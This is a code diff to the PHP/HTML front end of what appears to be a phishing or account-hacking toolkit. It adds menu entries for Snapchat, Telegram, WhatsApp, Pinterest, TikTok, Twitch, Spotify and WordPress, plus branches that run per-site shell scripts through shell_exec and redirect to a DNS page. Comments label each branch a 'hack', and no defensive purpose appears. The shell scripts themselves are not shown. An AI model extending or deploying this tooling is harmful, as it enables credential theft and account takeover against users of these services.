@@ -186,45 +186,78 @@ $(document).ready(function(){
     <option selected disabled> Ready websites </option>
     
      <optgroup label="Social Media">
-    <option value ="https://www.facebook.com">  &#120125; &nbsp; Facebook </option>
-    <option value ="https://www.twitter.com"> &#120139; &nbsp; Twitter </option>
-    <option value ="https://www.instagram.com"> &#120128; &nbsp; Instagram </option>
+    <option value ="https://www.facebook.com">  (&#120125;) &nbsp; Facebook </option>
+    <option value ="https://www.twitter.com"> (&#120139;) &nbsp; Twitter </option>
+    <option value ="https://www.instagram.com"> (&#120128;) &nbsp; Instagram </option>
+    <option value ="https://www.snapchat.com"> (&sect;) &nbsp; Snapchat </option>
       </optgroup>
 
 
         <option disabled> </option>
 
    <optgroup label="Chat">
-    <option value ="https://www.messenger.com">  &#x4D; &nbsp; Messenger </option>
-      </optgroup>
+     <option value ="https://www.messenger.com">  (&#x4D;) &nbsp; Messenger </option>
+     <option value ="https://www.telegram.com">  (&Tcaron;) &nbsp; Telegram </option>
+     <option value ="https://www.whatsapp.com">  (&Wcirc;) &nbsp; Whatsapp </option>
+   </optgroup>
 
 
           <option disabled> </option>
 
    <optgroup label="Other Social Media">
-    <option value ="https://www.linkedin.com">  &Lacute; &nbsp; Linkedin </option>
+    <option value ="https://www.linkedin.com">  (&Lacute;) &nbsp; Linkedin </option>
+    <option value ="https://www.pinterest.com"> (&#503;) &nbsp; Pinterest </option>
       </optgroup>
 
       
      <option disabled> </option>
 
        <optgroup label="Email">
-    <option value ="https://www.gmail.com"> &#120126; &nbsp; Gmail </option>
-    <option value ="https://login.live.com"> &Omacr; &nbsp; Outlook </option>
-    <option value ="https://www.yahoo.com"> &#120144; &nbsp; Yahoo </option>
+    <option value ="https://www.gmail.com"> (&#120126;) &nbsp; Gmail </option>
+    <option value ="https://login.live.com"> (&Omacr;) &nbsp; Outlook </option>
+    <option value ="https://www.yahoo.com"> (&#120144;) &nbsp; Yahoo </option>
       </optgroup>
       
       <option disabled> </option>
       
         <optgroup label="Companies">
-         <option value ="https://www.microsoft.com"> &#x4D; &nbsp; Microsoft </option>
-         <option value ="https://www.adobe.com"> &Abreve; &nbsp; Adobe </option>
+         <option value ="https://www.microsoft.com"> (&#x4D;) &nbsp; Microsoft </option>
+         <option value ="https://www.adobe.com"> (&Abreve;) &nbsp; Adobe </option>
       </optgroup>
+
+
+            <option disabled> </option>
+      
+        <optgroup label="Video">
+         <option value ="https://www.tiktok.com"> (&Tstrok;) &nbsp; Tiktok </option>
+      </optgroup>
+
+
+     <option disabled> </option>
+      
+        <optgroup label="Tv">
+         <option value ="https://www.twitch.com"> (&#428;) &nbsp; Twitch </option>
+      </optgroup>
+
       
           <option disabled> </option>
       
         <optgroup label="Cinema">
-         <option value ="https://www.netflix.com"> &Ncedil; &nbsp; Netflix </option>
+         <option value ="https://www.netflix.com"> (&Ncedil;) &nbsp; Netflix </option>
+      </optgroup>
+
+     
+          <option disabled> </option>
+      
+        <optgroup label="Music">
+         <option value ="https://www.spotify.com"> (&Scaron;) &nbsp; Spotify </option>
+       </optgroup>
+
+  
+         <option disabled> </option>
+      
+        <optgroup label="Cms">
+         <option value ="https://www.wordpress.com"> (&#1308;) &nbsp; Wordpress </option>
       </optgroup>
       
   </select>
@@ -518,6 +551,23 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
+     else if ($site_ready=='https://www.snapchat.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./snapchat.sh');
+
+
+   // echo '<script type="text/javascript">alert("Snapchat hack successfully");
+   //   </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of snapchat
+
+
+
+
      //CHAT
 
       else if ($site_ready=='https://www.messenger.com')
@@ -536,6 +586,41 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
     } // end if of messenger
 
 
+ 
+    else if ($site_ready=='https://www.telegram.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./telegram.sh');
+
+
+
+   // echo '<script type="text/javascript">alert("Telegram hack successfully");
+   //   </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of telegram
+
+
+
+   else if ($site_ready=='https://www.whatsapp.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./whatsapp.sh');
+
+
+
+   // echo '<script type="text/javascript">alert("Whatsapp hack successfully");
+   //   </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of whatsapp
+
+
+
 
 
      //OTHER SOCIAL MEDIA
@@ -547,7 +632,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
     shell_exec('shell/./linkedin.sh');
     
 
-   // echo '<script type="text/javascript">alert("Adobe hack successfully");
+   // echo '<script type="text/javascript">alert("Linkedin hack successfully");
     //  </script>';
      echo ("<script>location.href='dns.php'</script>");
      
@@ -555,6 +640,21 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
     } // end if of linkedin
      
      
+
+     else if ($site_ready=='https://www.pinterest.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./pinterest.sh');
+
+
+   // echo '<script type="text/javascript">alert("Pinterest hack successfully");
+   //   </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of pinterest
+
      
      
 
@@ -653,6 +753,47 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
+ 
+     //VIDEO
+
+    else if ($site_ready=='https://www.tiktok.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./tiktok.sh');
+    
+
+   // echo '<script type="text/javascript">alert("Tiktok hack successfully");
+    //  </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of tiktok
+     
+
+
+
+
+
+      //TV
+
+    else if ($site_ready=='https://www.twitch.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./twitch.sh');
+    
+
+   // echo '<script type="text/javascript">alert("Twitch hack successfully");
+    //  </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of twitch
+
+
+
+
 
     //CINEMA
 
@@ -671,6 +812,45 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
     } // end if of netflix
     
    
+
+
+    //MUSIC
+
+    else if ($site_ready=='https://www.spotify.com')
+       {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./spotify.sh');
+    
+
+   // echo '<script type="text/javascript">alert("Spotify hack successfully");
+    //  </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of spotify
+    
+
+
+  
+
+
+    //CMS
+
+    else if ($site_ready=='https://www.wordpress.com')
+         {
+
+    shell_exec('shell/./permissions.sh');
+    shell_exec('shell/./wordpress.sh');
+    
+
+   // echo '<script type="text/javascript">alert("Spotify hack successfully");
+    //  </script>';
+     echo ("<script>location.href='dns.php'</script>");
+     
+
+    } // end if of wordpress   
+
 
 
 
